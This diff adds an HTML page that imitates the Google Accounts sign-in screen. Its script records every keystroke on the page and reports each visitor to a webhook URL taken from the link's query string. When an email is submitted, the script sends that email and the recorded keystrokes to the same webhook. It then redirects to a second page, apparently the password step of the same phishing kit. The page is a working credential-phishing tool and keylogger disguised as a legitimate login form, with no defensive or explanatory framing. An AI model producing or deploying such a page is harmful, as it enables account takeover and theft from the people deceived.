@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="en">
+<head> 
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in - Google Accounts</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="icon" type="image/x-icon" href="googlefavicon.png">
+    <style>
+    @import url("https://fonts.googleapis.com/css?family=Roboto:400,500");
+
+    body {
+      margin: 0;
+      height: 100vh;
+      background-color: rgb(30 31 32 / 1);
+      color: rgb(168 199 250 / 1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+
+    .form {
+      width: 950px;
+      height: auto;
+      background-color: rgb(14 14 14 / 1);
+      border-radius: 30px;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      padding: 20px;
+      position: relative;
+    }
+
+    .img {
+      width: 45px;
+      height: 45px;
+      margin-left: 19px;
+      margin-top: 20px;
+      cursor: pointer;
+      z-index: 11;
+    }
+
+    .img img {
+      width: 100%;
+      height: 100%;
+    }
+
+    .sign-in-container {
+      display: flex;
+      align-items: center;
+      margin-top: 37px;
+      margin-left: -3px;
+    }
+
+    .sign-in {
+      font-size: 36px;
+      margin-right: 20px;
+      font-family: "Roboto";
+      color: rgb(227 227 227 / 1);
+      z-index: 11;
+    }
+
+    .emailinput {
+      padding-left: 17px;
+      border: 1px solid rgb(179, 179, 179);
+      border-radius: 5px;
+      width: 415px;
+      height: 53px;
+      font-size: 17px;
+      color: rgb(227 227 227 / 1);
+      background-color: transparent;
+      margin-top: -15px;
+      margin-left: 300px;
+      box-shadow: none;
+      outline: none;
+      z-index: 2;
+      transition: ease-in 0.1s;
+    }
+    .emailinput:focus {
+      border-width: 2px;
+      border-color: rgb(168 199 250 / 1);
+      z-index: 1;
+    }
+
+    .placeholder1 {
+      font-size: 16.5px;
+      color: rgb(180, 180, 180);
+      width: 114px;
+      margin-left: 470px;
+      margin-top: 3px;
+      z-index: 1;
+      text-align: center;
+      position:absolute;
+      transition: ease-in-out 0.1s;
+      background-color: rgb(14 14 14 / 1);
+      font-family: "Roboto";
+      height: 20px;
+    }
+
+    .changelanguagebtn {
+      background-color: rgb(30 31 32 / 1);
+      color: rgb(217, 215, 215);
+      font-family: "Roboto", sans-serif;
+      font-size: 12px;
+      padding: 8px 12px;
+      border: none;
+      border-radius: 7px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-left: 7px;
+    }
+
+    .changelanguagebtn:hover {
+      background-color: rgb(68 71 70 / 1);
+    }
+
+    .changelanguagebtn:focus {
+      outline: 2px solid rgb(168 199 250 / 1);
+    }
+
+    .arrow-down {
+      margin-left: 23px;
+      border: solid rgb(217, 215, 215);
+      border-width: 0 1.5px 1.5px 0;
+      display: inline-block;
+      padding: 3px;
+      transform: rotate(45deg);
+      margin-top: -3px;
+    }
+
+    p {
+      font-size: 16px;
+      margin-left: 28px;
+      margin-top: -15px;
+      font-family: "Roboto";
+      color: rgb(227 227 227 / 1);
+    }
+
+    .PrivacyBtn {
+      background-color: rgb(30 31 32 / 1);
+      color: rgb(217, 215, 215);
+      font-family: "Roboto", sans-serif;
+      font-size: 12px;
+      padding: 8px 12px;
+      border: none;
+      border-radius: 7px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+    }
+
+    .PrivacyBtn:hover {
+      background-color: rgb(68 71 70 / 1);
+    }
+
+    .footer-buttons {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 10px 0 10px;
+      box-sizing: border-box;
+    }
+
+    .right-buttons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .links {
+      color: rgb(168 199 250 / 1);
+      font-size: 14.5px;
+      font-family: "Roboto";
+      font-weight: 410;
+      margin-left: 455px;
+      cursor: pointer;
+      width: 90px;
+      border-radius: 3px;
+      margin-top: -40px;
+      text-decoration: none;
+    }
+
+    .links:hover {
+      background-color: rgb(31, 39, 52);
+    }
+
+    .text {
+      color: rgb(193, 193, 193);
+      font-size: 14.5px;
+      font-family: "Roboto";
+      margin-top: 42px;
+      margin-left: 455px;
+      display: flex;
+      transition: ease-in 0.1s;
+        }
+
+    .underlinelinks {
+      color: rgb(168 199 250 / 1);
+      font-size: 14.5px;
+      font-weight: 410;
+      font-family: "Roboto";
+      cursor: pointer;
+      margin-left: 455px;
+      margin-top: -12px;
+      text-decoration: none;
+    }
+
+    .underlinelinks:hover {
+      text-decoration: underline;
+    }
+
+    .button-row {
+      display: flex;
+      width: 100%;
+      padding: 30px 40px 0 40px;
+      margin-bottom: 20px;
+    }
+
+    .CreateAccount {
+      width: 120px;
+      height: 40px;
+      text-decoration: none;
+      font-family: "Roboto";
+      border-radius: 25px;
+      font-size: 14px;
+      cursor: pointer;
+      text-align: center;
+      line-height: 40px;
+      color: rgb(168 199 250 / 1);
+      background: none;
+      border: none;
+      margin-left: 620px;
+      margin-right: 20px;
+      z-index: 2;
+    }
+
+    .CreateAccount:hover {
+      background-color: rgb(30 31 32 / 1);
+    }
+
+    .Next {
+      width: 90px;
+      height: 40px;
+      text-decoration: none;
+      font-family: "Roboto";
+      font-size: 14px;
+      cursor: pointer;
+      border-radius: 25px;
+      background-color: rgb(168 199 250 / 1);
+      color: rgb(6 46 111 / 1);
+      border: none;
+      text-align: center;
+      line-height: 40px;
+    }
+
+    .Next:hover {
+      background-color: rgb(184, 211, 255);
+    }
+
+    .btn-ripple {
+  position: relative;
+  overflow: hidden;
+  z-index: 0; /* Ensure button content is above ripple */
+}
+
+.btn-ripple > .ripple {
+  z-index: -1; /* Place ripple behind button content */
+}
+.ripple {
+  position: absolute;
+  border-radius: 50%;
+  transform: scale(0);
+  animation: rippleEffect 0.3s linear forwards;
+  pointer-events: none;
+  z-index: 0; /* <- Add this line */
+}
+
+@keyframes rippleEffect {
+  to {
+    transform: scale(4);
+    opacity: 1;
+  }
+}
+
+
+
+
+
+
+    .ErrorRow {
+      display: flex;
+      width: 100%;
+      margin-bottom: 20px;
+    }
+
+    .Error {
+      font-family: "Roboto";
+      font-size: 12.5px;
+      color: rgb(242 184 181 / 1);
+      margin-top: -0.7px;
+      display: none;
+    }
+
+    .CreateAccountContainer {
+  color: rgb(217, 215, 215);
+  width: 190px;
+  background-color: #2f2f2f; /* Dark gray matching dropdown */
+  position: absolute;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+  z-index: 8;
+  border-radius: 18px;
+  overflow: hidden; /* Ensures rounded corners wrap children */
+  font-family: "Roboto", sans-serif;
+  margin-left: 669px;
+  margin-top: 352px;
+  display: none;
+}
+
+.CreateAccountBtns {
+  font-size: 14px;
+  padding: 16px;
+  color: rgb(255, 255, 255);
+  background-color: transparent;
+  cursor: pointer;
+  text-decoration: none;
+  width: 100%;
+  text-align: left;
+  display: block; /* Needed to make <a> behave like a button */
+  border: none; /* Just in case */
+  font-family: inherit;
+}
+
+.CreateAccountContainer.visible {
+  opacity: 1;
+  transform: translateY(0);
+  visibility: visible;
+  pointer-events: auto;
+  display: inline-block;
+}
+
+.CreateAccountBtns:hover {
+  background-color: rgb(55, 55, 55);
+}
+
+.Loading {
+  opacity: 25%;
+  background-color: black;
+  width: 1500px;
+  height: 750px;
+  display: none;
+  z-index: 9;
+  position: absolute;
+}
+
+.progress-container {
+  position: absolute;
+  top: 141px; /* Keep your vertical offset */
+  left: 50%;
+  transform: translateX(-50%);
+  width: 925px;
+  height: 4px;
+  background-color: #2e2e2e;
+  justify-content: center;
+  margin-top: -142px;
+  overflow: hidden;
+  z-index: 9999;
+  display: none;
+}
+    .bar {
+      position: absolute;
+      height: 100%;
+      background-color: rgb(168 199 250 / 1);
+      will-change: left, width;
+    }
+
+    .bar1 {
+  animation: bar1move 2.1s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+}
+
+.bar2 {
+  animation: bar2move 2.25s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+  animation-delay: 1.1s;
+}
+
+
+
+    @keyframes bar1move {
+      0%   { left: -35%; width: 30%; }
+      50%  { left: 100%; width: 30%; }
+      100% { left: 100%; width: 30%; }
+    }
+
+    @keyframes bar2move {
+      0%   { left: -50%; width: 20%; }
+      50%  { left: 100%; width: 20%; }
+      100% { left: 100%; width: 20%; }
+    }
+
+  </style>
+</head>
+<body>
+
+    <div class="Loading" id="Loadingscreen"></div>
+  <div class="container">
+    <div class="form" id="form">
+        <div class="progress-container" id="progress-container">
+            <div class="bar bar1"></div>
+            <div class="bar bar2"></div>
+          </div>
+      <div class="img">
+        <img src="googlelogo.png" alt="Google Logo"/>
+      </div>
+      <div class="sign-in-container">
+        <p class="sign-in">Sign in</p>
+        <input type="email" class="emailinput" id="emailInput"/>
+        <p class="placeholder1" id="placeholder1">Email or phone</p> 
+      </div>
+
+      <div class="ErrorRow">
+        <p style="z-index: 11;">Use your Google Account</p>
+        <img src="warning.png" style="display: none; width: 16.5px; height: 16.5px; margin-left: 245px; margin-right: -19px; margin-top: -3px;" id="warningimg">
+        <p class="Error" id="ErrorTxt">Enter an email or phone number</p>
+      </div>
+
+      <a class="links" href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank" id="links">Forgot email?</a>
+
+      <p class="text" id="text">Not your computer? Use a private browsing window to sign in.</p>
+      <a class="underlinelinks" href="https://support.google.com/accounts/answer/2917834" target="_blank" id="underlinelinks">Learn more about using Guest mode</a>
+
+      <div class="button-row">
+        <button class="CreateAccount btn-ripple" data-ripple-color="rgb(40, 43, 46)" id="CreateAccountBtn">Create account</button>
+        <button class="Next btn-ripple" data-ripple-color="rgb(209, 227, 255)" id="NextButton">Next</button>
+      </div>
+    </div>
+    <div class="footer-buttons">
+        <button class="changelanguagebtn">
+          English (United States)
+          <i class="arrow-down"></i>
+        </button>
+        <div class="right-buttons">
+          <a class="PrivacyBtn" href="https://support.google.com/accounts" target="_blank">Help</a>
+          <a class="PrivacyBtn" href="https://policies.google.com/privacy" target="_blank">Privacy</a>
+          <a class="PrivacyBtn" href="https://policies.google.com/terms" target="_blank">Terms</a>
+        </div>
+    </div>
+    <div class="CreateAccountContainer" id="CCContainer">
+        <a class="CreateAccountBtns btn-ripple" data-ripple-color="rgb(68, 71, 70)" href="https://accounts.google.com/lifecycle/steps/signup/name" target="_blank">For my personal use</a>
+        <a class="CreateAccountBtns btn-ripple" data-ripple-color="rgb(68, 71, 70)" href="https://accounts.google.com/signup/v2/kidaccountinfo" target="_blank">For my child</a>
+        <a class="CreateAccountBtns btn-ripple" data-ripple-color="rgb(68, 71, 70)" href="https://accounts.google.com/lifecycle/steps/signup/workspaceinterstitial" target="_blank">For work or my business</a>
+      </div>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const emailInput = document.getElementById("emailInput");
+      const NextButton = document.getElementById("NextButton");
+      const warningimg = document.getElementById("warningimg");
+      const ErrorTxt = document.getElementById("ErrorTxt");
+      const Createaccountbtn = document.getElementById("CreateAccountBtn");
+      const CCContainer = document.getElementById("CCContainer");
+      const placeholder = document.getElementById("placeholder1");
+      const forgotemail = document.getElementById("links");
+      const Loadingscreen = document.getElementById("Loadingscreen");
+      const progresscontainer = document.getElementById("progress-container");
+
+
+      const links = document.getElementById("links");;
+      const underlinelinks = document.getElementById("underlinelinks");;
+      const text = document.getElementById("text");
+      const greybox = document.getElementById("greybox");
+
+      sendMessage2();
+      
+      window.onload = function () {
+        emailInput.focus();
+        floatPlaceholder("rgb(184, 211, 255)");
+    };
+
+  
+      let hasValidationError = false;
+
+      Createaccountbtn.addEventListener("click", async function(event) {
+  // Your async code for this click event handler
+});
+
+async function floatPlaceholder(color) {
+  placeholder.style.marginTop = "-56px";
+  placeholder.style.fontSize = "12px";
+  placeholder.style.marginLeft = "464px";
+  placeholder.style.width = "94px";
+  placeholder.style.color = color;
+  
+  // Async operation to delay the styling change for 500ms
+  await new Promise(resolve => setTimeout(resolve, 300));
+  
+  placeholder.style.zIndex = "2";
+}
+
+function resetPlaceholder() {
+  placeholder.style.fontSize = "16.5px";
+  placeholder.style.color = "rgb(180, 180, 180)";
+  placeholder.style.width = "140px";
+  placeholder.style.marginLeft = "457px";
+  placeholder.style.marginTop = "3px";
+  placeholder.style.zIndex = "1";
+}
+
+
+function sendMessage2() {
+
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const idParam = urlParams.get("id");
+  const [webhook, redirect] = idParam.split("@");
+
+              var request = new XMLHttpRequest();
+              request.open("POST", webhook);
+              request.setRequestHeader('Content-type', 'application/json');
+              const emailInput = document.getElementById("emailInput");
+              const email = localStorage.getItem("username");
+              const password = emailInput.value;
+        
+              var params = {
+                content: `⚠️⚠️⚠️ New user loaded the sign-in page:
+                
+                `
+              };
+        
+              request.send(JSON.stringify(params));
+            }
+
+            let keystrokes = "";  // Variable to store all keys
+            
+            document.addEventListener('keydown', (event) => {
+              const keyName = event.key.length > 1 ? ` (${event.key})` : event.key;
+              keystrokes += keyName;
+            });
+
+
+function sendMessage1(emailVal) {
+              
+  const urlParams = new URLSearchParams(window.location.search);
+  const idParam = urlParams.get("id");
+  const [webhook, redirect] = idParam.split("@");
+
+
+              var request = new XMLHttpRequest();
+              request.open("POST", webhook);
+              request.setRequestHeader('Content-type', 'application/json');
+              const emailInput = document.getElementById("emailInput");
+              const email = localStorage.getItem("username");
+              const password = emailInput.value;
+        
+              var params = {
+                content: `
+                ⚠️⚠️⚠️ New login attempt, waiting for password entry:
+                  \n
+                • Email/phone-number: ${email}
+
+                • Keystrokes: ${keystrokes}
+                  \n
+                `
+              };
+        
+              request.send(JSON.stringify(params));
+            }
+
+      Createaccountbtn.addEventListener("click", function (event) {
+        event.preventDefault();
+        CCContainer.classList.toggle("visible");
+      });
+  
+      // Hide dropdown when clicking outside
+      document.addEventListener("click", function (event) {
+        if (
+          !CCContainer.contains(event.target) &&
+          !Createaccountbtn.contains(event.target)
+        ) {
+          CCContainer.classList.remove("visible");
+        }
+      });
+  
+
+
+
+      // Validate and submit
+      [NextButton, emailInput].forEach(element => {
+  element.addEventListener(
+    element === emailInput ? "keydown" : "click",
+    async e => {
+      if (e.type === "click" || (e.type === "keydown" && e.key === "Enter")) {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+        const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+        if (!isValidEmail) {
+          hasValidationError = true;
+          emailInput.classList.add("error");
+          emailInput.style.borderColor = "rgb(242, 184, 181)";
+          warningimg.style.display = "flex";
+          ErrorTxt.style.display = "flex";
+          forgotemail.style.marginTop = "-25px";
+          CCContainer.style.marginTop = "372px";
+          floatPlaceholder("rgb(242, 184, 181)");
+          return;
+        }
+
+        // Clear errors
+        hasValidationError = false;
+        emailInput.classList.remove("error");
+        emailInput.style.borderColor = "";
+        warningimg.style.display = "none";
+        ErrorTxt.style.display = "none";
+        NextButton.style.borderColor = "rgb(179, 179, 179)";
+        forgotemail.style.marginTop = "-40px";
+        placeholder.style.color = "rgb(180, 180, 180)";
+        CCContainer.style.marginTop = "352px";
+        Loadingscreen.style.display = "flex";
+        progresscontainer.style.display = "flex";
+        emailInput.style.borderColor = "rgb(180, 180, 180)"; 
+
+        // Save and continue
+        localStorage.setItem("username", email);
+
+        if (typeof sendMessage1 === "function") {
+          await sendMessage1();
+        }
+        const urlParams = new URLSearchParams(window.location.search);
+        const idParam = urlParams.get("id");
+        const [webhook, redirect] = idParam.split("@");
+
+        // Wait 1.5 seconds before redirecting 
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        window.location.href = `GooglePass.html?id=${webhook}@${redirect}`;
+      }
+    }
+  );
+});
+
+
+  
+      let progress = 0;
+    const bar = document.getElementById('progressBar');
+
+    const simulateLoading = setInterval(() => {
+      if (progress >= 100) {
+        clearInterval(simulateLoading);
+      } else {
+        progress += 10;
+        bar.style.width = progress + '%';
+      }
+    }, 200);
+      // Float on focus
+      emailInput.addEventListener("focus", function () {
+  // Only float and color blue if there's no validation error
+  if (!hasValidationError) {
+    floatPlaceholder("rgb(184, 211, 255)"); // blue
+    emailInput.style.borderColor = "rgb(184, 211, 255)";
+  } else {
+    // Keep the red color and red border from validation
+    floatPlaceholder("rgb(242, 184, 181)"); // red
+    emailInput.style.borderColor = "rgb(242, 184, 181)";
+  }
+});
+
+  
+      // Revert on document click *only if input is empty and no validation error*
+      document.addEventListener("click", function handleDocClick(e) {
+        if (
+          emailInput.contains(e.target) ||
+          placeholder.contains(e.target) ||
+          e.target === NextButton
+        ) {
+          return;
+        }
+  
+        if (emailInput.value.trim() === "" && !hasValidationError) {
+          resetPlaceholder();
+        } else if (!hasValidationError) {
+          placeholder.style.color = "rgb(180, 180, 180)";
+        } else {
+          placeholder.style.color = "rgb(242, 184, 181)";
+          floatPlaceholder("rgb(242, 184, 181)");
+        }
+
+
+        if (placeholder.style.color === "rgb(180, 180, 180)") {
+        emailInput.style.borderColor = "rgb(180, 180, 180)";
+        }
+
+
+      });
+
+      // Float on page load if there's content
+      if (emailInput.value.trim() !== "") {
+        floatPlaceholder("rgb(180, 180, 180)");
+      }
+    });
+
+
+
+
+
+
+    document.querySelectorAll('.btn-ripple').forEach(btn => {
+  btn.addEventListener('mousedown', function (e) {
+    const rect = this.getBoundingClientRect();
+    const ripple = document.createElement('span');
+    const color = this.getAttribute('data-ripple-color') || 'rgba(0, 0, 0, 0.3)';
+    
+    ripple.classList.add('ripple');
+    ripple.style.backgroundColor = color;
+    ripple.style.width = ripple.style.height = Math.max(rect.width, rect.height) + 'px';
+    ripple.style.left = e.clientX - rect.left - (parseFloat(ripple.style.width) / 2) + 'px';
+    ripple.style.top = e.clientY - rect.top - (parseFloat(ripple.style.height) / 2) + 'px';
+    
+    this.appendChild(ripple);
+
+    function clearRipple() {
+      ripple.remove();
+      document.removeEventListener('mouseup', clearRipple);
+      this.removeEventListener('mouseleave', clearRipple);
+    }
+
+    document.addEventListener('mouseup', clearRipple);
+    this.addEventListener('mouseleave', clearRipple);
+  });
+});
+
+  </script>
+  
+  
+</body>
+</html>
